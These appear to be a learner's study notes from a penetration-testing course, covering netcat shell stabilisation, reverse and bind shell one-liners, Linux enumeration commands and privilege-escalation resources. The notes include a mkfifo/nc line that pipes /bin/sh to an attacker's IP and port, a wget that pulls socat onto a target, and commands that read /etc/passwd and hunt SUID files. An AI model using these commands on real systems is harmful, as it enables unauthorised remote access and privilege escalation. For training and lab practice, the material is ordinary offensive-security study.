# What the Shell 
## Netcat Shell Stabilisation  
### Technique 1: Python  
command:  
```
step 1: python -c 'import pty;pty.spawn("/bin/bash")'  

step 2: export TERM=xterm  

step 3: stty raw -echo; fg  
```
### Technique 2: rlwrap  
command: 
```
rlwrap nc -lvnp <port>  //background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell
```
### Technique 3: Socat  

command： 
```
sudo python3 -m http.server 80
wget <LOCAL-IP>/socat -O /tmp/socat  //download socat static compiled binary in target 

stty -a //note rows and columns in own terminal 

stty rows number   //set in shell 
stty cols numver   //set in shell 
```
### Socat Encrypted Shells 
### Common Shell Payloads 

a bit of vague***   

command:  
```
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f   //a bit of hard, but don't worry

mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
[PayloadAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

### practice and example  
command:  
```
remmina  //login to the windows server
```


# Linux Privilege Escalation

## Enumeration 
### manul
[cut command](https://www.geeksforgeeks.org/cut-command-linux-examples/)  
[2>/dev/null ](https://qr.ae/pKgBo5)  
command:  
```
hostname //hostname of the target machine  
uname -a  //kernel information 
cat /proc/version  //proc filesystem kernel
cat /etc/issue  //system information  
ps //running processes 
ps -A //all runing processes 
ps axjf //process tree  
ps aux  //precess for all users
env /environmental variables 
sudo -l //what commands your user can run using sudo 
ls 
ls -l 
ls -la 
id //list general overview of the user's privilege level and group memberships
id <usrname>
cat /etc/passwd  
cat /etc/passwd | cut -d ":" -f 1 
cat /etc/passwd | grep home 
history
ifconfig  
ip route 
netstat -a 
netstat -at 
netstat -au  
netstat -l 
netstat -lt
netstat -s 
netstat -st
netstat -su
netstat -tp 
netstat -ltp   //run in root can complete display
netstat -i //show interface statistics  
netstat -ano //-a display all sockets -n do not resolve names -o display timers

find command 
find . -name flag1.txt //find the file named “flag1.txt” in the current directory
find /home -name flag1.txt //find the file names “flag1.txt” in the /home directory
find / -type d -name config //find the directory named config under “/”
find / -type f -perm 0777 //find files with the 777 permissions (files readable, writable, and executable by all users)
find / -perm a=x //find executable files
find /home -user frank //find all files for user “frank” under “/home”
find / -mtime 10 //find files that were modified in the last 10 days
find / -atime 10 //find files that were accessed in the last 10 day
find / -cmin -60 //find files changed within the last hour (60 minutes)
find / -amin -60 //find files accesses within the last hour (60 minutes)
find / -size 50M //find files with a 50 MB size
find / -size +100M  
find / -size +100M -type f 2 2>/dev/null 

find / -writable -type d 2>/dev/null  //Find world-writeable folders
find / -perm -222 -type d 2>/dev/null //Find world-writeable folders
find / -perm -o w -type d 2>/dev/null //Find world-writeable folders
find / -perm -o x -type d 2>/dev/null  //Find world-executable folders

find / -name perl*
find / -name python*
find / -name gcc*

find / -perm -u=s -type f 2>/dev/null  //Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
```
###  Automated 
1. [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
2. [LinEnum](https://github.com/rebootuser/LinEnum)
3. [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
4. [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) ***
5. [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

##  Privilege Escalation: Kernel Exploits  
step 1: identify the kernel version  
step 2: search public exploit  
step 3: run the exploit   

sources:  
1. google  
2. [linuxkernelcves](https://www.linuxkernelcves.com/cves)
3. [LES](https://github.com/The-Z-Labs/linux-exploit-suggester)

Notes:
1. search specific 
2. before exploit, underestand code
3. some exploits may require further interaction, read comments
4. python server transfer code 

CVE:  
* [CVE-2015-1328](https://github.com/SecWiki/linux-kernel-exploits/blob/master/2015/CVE-2015-1328/README.md)
